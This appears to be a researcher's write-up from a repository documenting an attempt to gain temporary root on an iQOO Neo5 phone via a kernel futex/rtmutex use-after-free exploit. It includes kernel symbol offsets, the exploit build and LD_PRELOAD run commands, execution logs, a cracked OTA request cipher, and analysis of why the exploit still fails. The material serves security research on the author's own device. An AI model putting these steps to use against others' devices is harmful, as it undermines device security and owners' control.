# iQOO Neo5 (PD2055) Temporary Root via CVE-2026-43499 — Full Write-up

> **Author**: Viper-Boss (with AI assistance from DeepSeek Harness)
> **Date**: 2026-11-08 ~ 2026-11-09
> **Device**: iQOO Neo5 (V2055A / PD2055) · Snapdragon 870 · Android 14 · OriginOS 4
> **Firmware**: PD2055_A_9.10.3 (kernel 4.19.152-perf+)
> **Status**: 🟡 Exploit builds & runs, futex collision confirmed, mm_struct scan blocked (hash mismatch)

---

## 1. Why I'm doing this

My iQOO Neo5 has a locked bootloader with **no unlock path**:
- `fastboot flashing unlock` → `unknown command` (vivo removed it from the bootloader)
- `fastboot oem unlock` → `unknown command`
- vivo's official BL unlock channel was discontinued years ago
- No signed firehose for EDL (9008) mode exists publicly for this device

I wanted temporary root without unlocking, and I found the CVE-2026-43499 exploit (GhostLock). This article documents my full journey — including all dead ends — so others don't waste time repeating them.

---

## 2. TL;DR — What works and what doesn't

| Step | Status | Notes |
|------|--------|-------|
| CVE-2026-43499 futex UAF trigger | ✅ Works | 3 collisions found per run, device stable |
| Firmware acquisition (7GB full OTA) | ✅ Works | Cracked vivo's legacy OTA protocol |
| Kernel kallsyms extraction (109,641 symbols) | ✅ Works | Custom parser for vivo's modified kallsyms |
| target.h offsets (24 symbols) | ✅ Works | init_task, selinux_state, kmalloc_caches, etc. |
| NDK build of preload.so | ✅ Works | Compiles clean, 157KB |
| KernelSnitch mm_struct brute-force | ❌ Blocked | futex hash function mismatch (see §8) |
| Final uid=0 privilege escalation | ⏳ Pending | Requires fixing the hash or alternative approach |

---

## 3. Device fingerprint (verified via adb shell)

```
ro.product.model=V2055A
ro.product.device=PD2055
ro.board.platform=kona
ro.soc.model=SM8250 (Snapdragon 870)
ro.build.version.release=14
ro.build.display.id=PD2055_A_9.10.3
ro.build.version.incremental=compiler10161353
ro.build.version.security_patch=2025-09-01
ro.build.type=user / release-keys

# Kernel
Linux version 4.19.152-perf+ (compiler@comdg01150025) (clang 10.0.5)
#1 SMP PREEMPT Thu Oct 16 14:02:35 CST 2025

# Boot chain
androidboot.verifiedbootstate=green
androidboot.vbmeta.device_state=locked
androidboot.veritymode=enforcing
androidboot.securebootkeyver=4
androidboot.secureboot_enable=1
```

### Kernel config highlights (from /proc/config.gz — readable without root!)

```
CONFIG_ARM64_VA_BITS=39, PGTABLE_LEVELS=3
CONFIG_PREEMPT=y, CONFIG_FUTEX_PI=y, CONFIG_RT_MUTEXES=y
CONFIG_KALLSYMS=y, CONFIG_KALLSYMS_ALL=y, CONFIG_IKHEADERS=y
CONFIG_SLAB_FREELIST_RANDOM=y, CONFIG_SLAB_FREELIST_HARDENED=y
CONFIG_SLUB_MIRROR=y          # ← vivo anti-exploitation hardening
CONFIG_PANIC_ON_REFCOUNT_ERROR=y
CONFIG_PANIC_ON_OOPS is NOT set (PANIC_ON_OOPS_VALUE=0)
CONFIG_MODULE_SIG_FORCE=y (sha512)
CONFIG_STATIC_USERMODEHELPER=y → /system/bin/vivo_coredump
CONFIG_RANDOMIZE_BASE=y (KASLR)
```

---

## 4. Dead ends I tried first (so you don't have to)

### 4.1 Official BL unlock
- `fastboot flashing get_unlock_ability` returns `1`
- But `fastboot flashing unlock` → `unknown command`
- vivo removed the unlock command from the bootloader entirely
- **Conclusion: impossible without vivo internal tools**

### 4.2 All "temporary root" tools from the ecosystem (月虹/GhostLock/DirtyFrag etc.)

I downloaded and statically analyzed ~15 different tools. Key finding:

**The iQOO temporary root ecosystem is a model-gated matrix:**

| Tool | Target | Kernel | Works on Neo5? |
|------|--------|--------|---------------|
| GhostLock 4.19 (K40 port) | Redmi K40 (alioth) | 4.19.157 GKI | ❌ Different offsets |
| 月虹提权助手 v1.6.4 | vivo 6.6 GKI devices | 6.6.30/57/89 | ❌ No vivo 4.19 payload |
| DirtyFrag / DirtyFlag | 5.15-6.12 GKI | GKI only | ❌ 4.19 not supported |
| KSuRoot | Various GKI | 5.10+ | ❌ Requires init_boot partition |
| All others | ... | ... | ❌ |

**Root cause**: The Neo5 (2021, SM8250) is too old for the GKI-era exploit ecosystem. All these tools target 2024-2026 flagship devices with 5.10+ GKI kernels. The Neo5's 4.19.152 non-GKI kernel was never targeted.

### 4.3 Recovery mode adb
- `adb reboot recovery` works
- But recovery has **no adbd** (vivo locked it down)
- USB device doesn't even enumerate in device manager
- **Conclusion: can't dd partitions from recovery**

### 4.4 Public firmware mirrors
- vivofirmware.com: only has PD2055_A_1.10.16 (2021 original)
- onfix.cn, gbfirmware.com, romzj.com.cn: all stop at 6.x (2023)
- **No public mirror has 9.10.3** (the final EOL version)
- vivo customer service confirmed: "官网已取消下载升级包的网页路径"

---

## 5. The firmware acquisition breakthrough

This was the hardest part. Here's the full chain:

### 5.1 The trick: use recovery's own online update

I rebooted into recovery mode, then used the recovery menu's "联网更新" (online update). This triggered the recovery to:
1. Query vivo's OTA server via `wget --post-data param=<obfuscated>&jvq=1.0.3 https://sysupgrade.vivo.com.cn/api2`
2. Download a 7GB full firmware package
3. Install it (type: REPAIR, since pre=post=PD2055D_A_9.10.3)

### 5.2 Capturing the evidence via bugreport

```bash
adb bugreport
# Extract: FS/cache/recovery/last_log
```

The recovery log contained:
- The full wget command with the encrypted `param` value
- The downloaded package path: `/data/vivo-others/survival/vivo-survival_1.0-UpdateFull_package.zip`
- Install confirmation: `INSTALL_SUCCESS`

### 5.3 Cracking vivo's legacy OTA protocol (jvq 1.0.3)

The "encryption" turned out to be a **substitution cipher + standard base64 of ASCII plaintext** — not real encryption at all.

**My approach:**

1. **Structural analysis**: All repeated substrings in the encrypted data had distances ≡ 0 (mod 4), proving it's base64 (repeats preserve alignment only at mod-4 boundaries)

2. **Known-plaintext attack**: The request contained the device's IMEI hash (`<REDACTED_IMEI_HASH>` — from `last_ota_info` in the bugreport), the version string `PD2055D_A_9.10.3`, and `PD2055MA`. These gave me anchor points to derive symbol values.

3. **Hill climbing + oracle verification**: Re-encoding the decoded plaintext with the derived alphabet must produce the exact original ciphertext. This verified the solution.

4. **Critical bug fix**: Standard base64's third byte formula is `b2 = ((v2&3)<<6)|v3`, NOT `<<4`. This was a hours-long bug that produced subtly wrong results.

**The decrypted response:**

```json
{
  "fileLength": "7039074100",
  "version": "9.10.3",
  "url": "http://sysupgrade.vivo.com.cn/dapi2.do?fileName=%40a160970%3D1Wb74zZnMyZkEQMylyN9YS0gMdN46HMkYHYggQN4FiZ9USMPFQM8DyMwZSN8FSMz1XN90",
  ...
}
```

### 5.4 Downloading the firmware

```bash
curl --noproxy '*' -L -C - --retry 30 \
  -o PD2055_A_9.10.3_full.zip \
  "http://sysupgrade.vivo.com.cn/dapi2.do?fileName=%40a160970%3D..."
# 7,039,074,100 bytes, ~110 MB/s direct from vivo CDN
```

---

## 6. Kernel kallsyms extraction

The boot.img from the firmware had a standard v2 header:
```
kernel_size=50759696, page_size=4096, kernel_addr=0x8000
```

### 6.1 Extracting the kernel Image

The kernel blob started at offset `page_size` (4096) but had a 52-byte vivo wrapper before the actual ARM64 Image:
```
[52-byte vivo header][ARM64 kernel Image (48.4MB)]
```

### 6.2 vivo's anti-reverse-engineering modifications

vivo modified the kernel to hinder kallsyms extraction:
1. **Image header fields zeroed**: `text_offset=0, image_size=0, flags=0` (normally 0x80000, etc.)
2. **kallsyms_markers removed** from its standard position
3. **Custom markers format**: u32 values at 8-byte stride (instead of standard u64/u32)

### 6.3 My custom kallsyms parser

Since `vmlinux-to-elf` and other tools failed on vivo's modifications, I wrote a custom parser:

```
Token table:     0x2159ecc - 0x215a259 (256 tokens, 909 bytes)
Token index:     0x215a2cc (256 × u16, verified 256/256)
Markers:         0x21590cc (429 entries, u32 @ 8-byte stride)
Names:           0x1febb9b - 0x21590cc (1,495,175 bytes, 4.19 format)
Offsets table:   0x1f805bc - 0x1feb7a8 (109,691 entries × s32)
```

**Total: 109,641 symbols extracted** (the ~50 offset discrepancy is from alignment padding).

### 6.4 Key symbols for target.h

```
init_task (__start_init_task):  0x02926c40
init_uts_ns:                     0x02d9e688
empty_zero_page:                 0x030433d8
root_task_group:                 0x0306dbaa
selinux_state:                   0x024cdc60
security_hook_heads:             0x024cdc58
kmalloc_caches:                  0x024c4fec
anon_pipe_buf_ops:               0x01cf8de0
remove_waiter (the bug!):        0x000d4198
ashmem_fops:                     0x01e6f680
configfs_read_file:              0x0033ae18
modprobe_path:                   0x02db28e8
panic:                           0x0003bbe8
printk:                          0x000dd888
```

---

## 7. Building the exploit

I used the open-source [GhostLock CVE-2026-43499 exploit](https://github.com/yijiacloud/ghostlock-cve-2026-43499-4.19-k40) (Apache-2.0, originally for Redmi K40 / Snapdragon 870 class 4.19 kernels) as the base.

```bash
# In WSL Ubuntu 26.04
export NDK_ROOT=~/android-ndk-r27c
CC=$NDK_ROOT/toolchains/llvm/prebuilt/linux-x86_64/bin/aarch64-linux-android35-clang

# Build preload.so
$CC -O2 -g0 -Isrc -DTARGET_CONFIG_H="targets/pd2055-4.19.152-perf/target.h" \
    -fPIC -shared -o preload.so -pthread \
    src/main.c src/util.c src/slide.c src/fops.c src/pipe.c src/root.c \
    src/preload.c src/su_blob.S src/wallpaper_blob.S
```

### Running the exploit

```bash
adb push preload.so /data/local/tmp/
adb shell "LD_PRELOAD=/data/local/tmp/preload.so id"
```

### What happens (from the fsync log):

```
[+] preload starting pid=25073
[+] startup context uid=2000 euid=2000 attr=u:r:shell:s0 enforce=1
[+] build config label=pd2055_4.19.152_perf_a14
[*] memory detected ram=0x300000000 (12 GB)
[*] futex_init hashsize=0x800 (cpus=8)
[*] found 3 collisions
[*] [  0] start finding mm_struct [ffffff8000000000-ffffff8080000000]
...
[-] KernelSnitch mm_struct leak failed
[-] prepare_kernel_page retry 1/12
... (12 retries, all fail)
```

**The futex collision detection works** (the CVE trigger is functional — we can detect hash collisions via timing). The device remains stable throughout (no kernel panics, thanks to `PANIC_ON_OOPS=0`).

---

## 8. Current blocker: futex hash mismatch in KernelSnitch

After deep source analysis, I identified the root cause:

### The Linux 4.19 kernel's futex hash:

```c
// kernel/futex.c (4.19)
static struct futex_hash_bucket *futex_hash(union futex_key *key)
{
    u32 hash = jhash2((void *)&key->both.word,    // ← starts at offset 8 (address)
                      sizeof(key->both.word)/4,    // ← 2 u32s (address only)
                      key->both.offset);           // ← initval = offset
    return &futex_queues[hash & (futex_hashsize - 1)];
}
```

**The kernel only hashes the user-space address (2 u32s). The mm_struct pointer is NOT part of the hash.**

### The exploit's futex hash (from the K40 port):

```c
// futex_hash.h (exploit)
uint32_t futex_hash(size_t addr, size_t mm)
{
    futex_key_t key;
    key.private.mm = (void *)mm;           // ← includes mm in the hash!
    key.private.address = addr & ~0xfff;
    key.private.offset = addr & 0xfff;
    return __futex_hash(&key, futex_hashsize);
}
// Internally: jhash2((u32*)key, 4, offset) → hashes mm + address (4 u32s)
```

**The exploit hashes 4 u32s (mm + address), but the kernel only hashes 2 u32s (address).**

This means the brute-force scanning for mm_struct addresses is solving a different equation than what the kernel uses — it will never find the correct answer regardless of how many candidates it tries.

### Fix approaches:

1. **Fix the hash function** to match 4.19 (2 u32s) — but then mm isn't in the hash, so the brute-force technique is fundamentally invalid
2. **Use a different mm_struct leak technique** — e.g., the pipe-based physical memory read primitive, or a different side channel
3. **Skip KernelSnitch entirely** and use the configfs fops hijack route directly (this is what the K40 exploit's `CHEESE_BASE_HUNT=1` mode does)

### Additional data from slabinfo (device-specific):

```
mm_struct: objsize=960 (0x3C0), 34 objects/slab, order 3
```

The actual mm_struct size is **960 bytes**, not 0x340 (832) as I initially set in target.h. And vivo has added `kmalloc-rcl-*` (reclaim) cache types that don't exist in stock 4.19.

---

## 9. Key files and tools in this repository

| File | Description |
|------|-------------|
| `target.h` | Complete offset table for PD2055 4.19.152-perf |
| `kallsyms.txt` | Full kernel symbol table (109,641 entries) |
| `target_offsets.txt` | Formatted offset values for target.h |
| `exploit/` | Modified GhostLock exploit source |
| `scripts/` | All analysis scripts (kallsyms parser, OTA decryptor, etc.) |
| `logs/` | Exploit execution logs from the device |

---

## 10. Reproduction steps

```bash
# 1. Get the firmware (requires the OTA protocol crack — see scripts/)
# 2. Extract boot.img from the zip
python3 -c "import zipfile; z=zipfile.ZipFile('PD2055_A_9.10.3_full.zip'); z.extract('boot.img')"

# 3. Parse the kernel Image (see scripts/parse_kallsyms.py)
# 4. Build the exploit
cd exploit && bash build.sh

# 5. Run on device
adb push build/pd2055-4.19.152-perf/bin/preload.so /data/local/tmp/
adb shell "LD_PRELOAD=/data/local/tmp/preload.so id"
```

---

## 11. Credits and references

- [GhostLock CVE-2026-43499 exploit](https://github.com/yijiacloud/ghostlock-cve-2026-43499-4.19-k40) by yijiacloud (Apache-2.0)
- [CVE-2026-43499](https://nvd.nist.gov/vuln/detail/CVE-2026-43499) — rtmutex remove_waiter() UAF
- Upstream: [NebuSec/CyberMeowfia](https://github.com/NebuSec/CyberMeowfia) (IonStack)
- [VIVO-OTA-Tracker](https://github.com/mytiantian001/VIVO-OTA-Tracker) — vivo OTA query tool (helped understand the protocol)
- [vmlinux-to-elf](https://github.com/marin-m/vmlinux-to-elf) — kernel symbol extraction (partially worked)

## 12. License

The exploit code is Apache-2.0 (inherited from upstream). My analysis, scripts, and documentation are released under the same license.

---

*This research is for educational purposes. Use only on hardware you own.*
